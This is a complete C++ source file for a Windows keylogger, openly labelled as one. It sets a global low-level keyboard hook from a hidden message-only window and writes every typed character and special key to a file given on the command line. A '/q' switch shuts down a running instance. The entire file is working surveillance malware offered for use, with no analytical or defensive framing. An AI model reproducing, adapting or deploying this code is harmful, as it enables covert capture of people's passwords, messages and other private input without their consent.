//KeyLogger
#define _WIN32_WINNT _WIN32_IE_WINBLUE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static constexpr const wchar_t *const g_wGuidClass = L"App::b9145702-7a05-43b9-af36-a2df4806c64e";
static HANDLE g_hFile;
static BYTE *g_pbKeyState;

//-------------------------------------------------------------------------------------------------
static LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_DESTROY)
    {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}

//-------------------------------------------------------------------------------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
    {
        DWORD dwBytes;
        const KBDLLHOOKSTRUCT *const pHookStruct = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        switch (pHookStruct->vkCode)
        {
        case VK_BACK:   WriteFile(g_hFile, L"<BackSpace>", 11*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_DELETE: WriteFile(g_hFile, L"<Delete>",     8*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_RETURN: WriteFile(g_hFile, L"<Enter>\r\n",  9*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_LEFT:   WriteFile(g_hFile, L"<Left>",       6*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_RIGHT:  WriteFile(g_hFile, L"<Right>",      7*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_ESCAPE: WriteFile(g_hFile, L"<Esc>",        5*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_TAB:    WriteFile(g_hFile, L"<Tab>",        5*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_HOME:   WriteFile(g_hFile, L"<Home>",       6*sizeof(wchar_t), &dwBytes, nullptr); break;
        case VK_END:    WriteFile(g_hFile, L"<End>",        5*sizeof(wchar_t), &dwBytes, nullptr); break;
        default:
            if (GetAsyncKeyState(VK_CONTROL) >= 0 && GetAsyncKeyState(VK_MENU) >= 0 && GetKeyboardState(g_pbKeyState))
                if (const HWND hWnd = GetForegroundWindow())
                    if (const DWORD dwThreadId = GetWindowThreadProcessId(hWnd, nullptr))
                    {
                        wchar_t wChar;
                        if (ToUnicodeEx(pHookStruct->vkCode, pHookStruct->scanCode, g_pbKeyState, &wChar, sizeof(wchar_t), 0, GetKeyboardLayout(dwThreadId)) > 0)
                        {
                            WORD wType;
                            if (GetStringTypeW(CT_CTYPE1, &wChar, 1, &wType) && (wType & (C1_BLANK | C1_PUNCT | C1_ALPHA | C1_DIGIT)))
                                WriteFile(g_hFile, &wChar, sizeof(wchar_t), &dwBytes, nullptr);
                        }
                    }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

//-------------------------------------------------------------------------------------------------
void FMain()
{
    if (const HWND hWnd = FindWindowExW(HWND_MESSAGE, nullptr, g_wGuidClass, nullptr))
        PostMessageW(hWnd, WM_CLOSE, 0, 0);

    if (wchar_t *wCmdLine = GetCommandLineW())
    {
        while (*wCmdLine == L' ' || *wCmdLine == L'\t')
            ++wCmdLine;
        if (*wCmdLine != L'\0')
        {
            //1st
            if (*wCmdLine++ == L'"')
            {
                while (*wCmdLine != L'\"')
                {
                    if (*wCmdLine == L'\0')
                        return;
                    ++wCmdLine;
                }
                ++wCmdLine;
                if (*wCmdLine != L' ' && *wCmdLine != L'\t')
                    return;
            }
            else
                while (*wCmdLine != L' ' && *wCmdLine != L'\t')
                {
                    if (*wCmdLine == L'\0' || *wCmdLine == L'\"')
                        return;
                    ++wCmdLine;
                }

            //2nd
            do {++wCmdLine;}
            while (*wCmdLine == L' ' || *wCmdLine == L'\t');
            if (*wCmdLine != L'\0')
            {
                const wchar_t *wArg = wCmdLine;
                if (*wCmdLine++ == L'"')
                {
                    while (*wCmdLine != L'\"')
                    {
                        if (*wCmdLine == L'\0')
                            return;
                        ++wCmdLine;
                    }
                    if (wCmdLine[1] != L' ' && wCmdLine[1] != L'\t' && wCmdLine[1] != L'\0')
                        return;
                    ++wArg;
                }
                else
                    while (*wCmdLine != L' ' && *wCmdLine != L'\t' && *wCmdLine != L'\0')
                        ++wCmdLine;
                *wCmdLine = L'\0';

                if (!(wArg[0] == L'/' && wArg[1] == L'q' && wArg[2] == L'\0') &&
                        (g_hFile = CreateFileW(wArg, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr)) != INVALID_HANDLE_VALUE)
                {
                    WNDCLASSEX wndCl;
                    wndCl.cbSize = sizeof(WNDCLASSEX);
                    wndCl.style = 0;
                    wndCl.lpfnWndProc = WindowProc;
                    wndCl.cbClsExtra = 0;
                    wndCl.cbWndExtra = 0;
                    wndCl.hInstance = nullptr;
                    wndCl.hIcon = nullptr;
                    wndCl.hCursor = nullptr;
                    wndCl.hbrBackground = nullptr;
                    wndCl.lpszMenuName = nullptr;
                    wndCl.lpszClassName = g_wGuidClass;
                    wndCl.hIconSm = nullptr;

                    if (RegisterClassExW(&wndCl))
                    {
                        const HINSTANCE hInst = GetModuleHandleW(nullptr);
                        if (CreateWindowExW(0, g_wGuidClass, nullptr, 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr))
                        {
                            BYTE bKeyState[256];
                            g_pbKeyState = bKeyState;        //***it's ok
                            if (const HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0))
                            {
                                MSG msg;
                                while (GetMessageW(&msg, nullptr, 0, 0) > 0)
                                    DispatchMessageW(&msg);
                                UnhookWindowsHookEx(hHook);
                            }
                        }
                        UnregisterClassW(g_wGuidClass, hInst);
                    }
                    CloseHandle(g_hFile);
                }
            }
        }
    }
}

//-------------------------------------------------------------------------------------------------
extern "C" int start()
{
    FMain();
    ExitProcess(0);
    return 0;
}
